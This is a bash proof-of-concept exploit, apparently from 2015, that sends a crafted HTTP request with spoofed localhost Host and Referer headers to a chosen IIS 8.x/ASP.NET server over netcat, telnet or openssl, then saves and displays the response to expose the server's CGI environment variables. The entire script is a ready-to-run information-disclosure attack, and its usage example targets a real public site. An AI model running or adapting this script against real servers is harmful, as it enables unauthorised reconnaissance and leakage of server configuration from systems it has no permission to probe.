#!/usr/bin/env bash
#
# IIS CGI Environment Variable Leakage Proof-of-Concept
#
# ./iisleakenv.bash www.iis.net.
#
# iisleakenv.bash by Derek Callaway <decal (AT) sdf {DOT} org>
# Tue Apr 28 10:01:08 UTC 2015
#
# Works best with: w3m, links or lynx
#


if [ ! "$1" ]
  then echo ''
  echo "usage: $0 HOST"
  echo "  HOST  hostname of IIS8.x server using ASP.NET via Azure"
  echo
  echo "  Environment Variables:"
  echo "    PORT  the TCP port number inetsrv.exe is listening on"
  echo "    ATLS  connect using a Transport Layer Security socket"
  echo
  echo "ex. ATLS=true $0 www.iis.net"
  echo ''

  exit 0
fi

chmod 0700 $0

export UMASK_SAVE=$(umask)
export DATESECS=`date +'%s'`

umask 0077

cat >> a.req.$DATESECS << __EOF__
GET http://localhost.localdomain/default.aspx HTTP/1.0
Host: 127.255.255.255
Referer: https://0.0.0.0/aspnet_client/
User-Agent: MSIE
Cache-Control: no-cache
Connection: close
Vary: *


__EOF__

export SSLCONN=$(which openssl) TCPCONN="$(which netcat)"

if [ ! "$TCPCONN" ]
  then export TCPCONN=$(which nc)

  [ ! "$TCPCONN" ] && export TCPCONN=$(which telnet)
fi

cat a.req.$DATESECS

if [ "$ATLS" -a "$SSLCONN" ]
  then [ ! "$PORT" ] && export PORT=443
  (sleep 1.8;cat a.req.$DATESECS;echo;sleep 1.4;echo) | $SSLCONN s_client -quiet -connect $1:$PORT \
    > ${DATESECS}.htm 2>/dev/null
else
  [ ! "$PORT" ] && export PORT=80
  (sleep +2;cat a.req.$DATESECS;echo) | nice $TCPCONN $1 $PORT \
    > ${DATESECS}.htm 2>/dev/null
fi

rm -f a.req.$DATESECS

export IISCGIHTM="${DATESECS}.html"

tail -n +13 ${DATESECS}.htm > $IISCGIHTM

rm -f ${DATESECS}.htm

echo

export PAGER_SAVE="$PAGER" PAGER="most"

if [ ! "$(which $PAGER)" ]
  then export PAGER="less"
elif [ ! "$(which $PAGER)" ]
  then export PAGER="more"
else
  [ ! "$(which more)" ] && export PAGER="/bin/cat"
fi

if [ "$(which w3m)" ]
  then w3m $IISCGIHTM

  echo "+ w3m $IISCGIHTM"

  whatis w3m 2>/dev/null
elif [ "$(which links)" ]
  then links $IISCGIHTM

  echo "+ links $IISCGIHTM"

  whatis links 2>/dev/null
elif [ "$(which lynx)" ]
  then lynx -verbose -xhtml-parsing -source -dump $IISCGIHTM | $PAGER

  echo "+lynx -verbose -xhtml-parsing -source -dump $IISCGIHTM"

  whatis lynx 2>/dev/null
else
  $PAGER $IISCGIHTM

  echo "+ $PAGER $IISCGIHTM"

  whatis $PAGER 2>/dev/null
fi

echo -n "$0:${LINENO}> Press any key!"
read -sp ''
echo

cp $IISCGIHTM iiscgienv-$$.html
rm -f $IISCGIHTM

echo "$0:${LINENO}> Do you wish to remove the HTML output file? (y/n)"

rm -i iiscgienv-$$.html

umask $UMASK_SAVE
export PAGER="$PAGER_SAVE"

exit 0

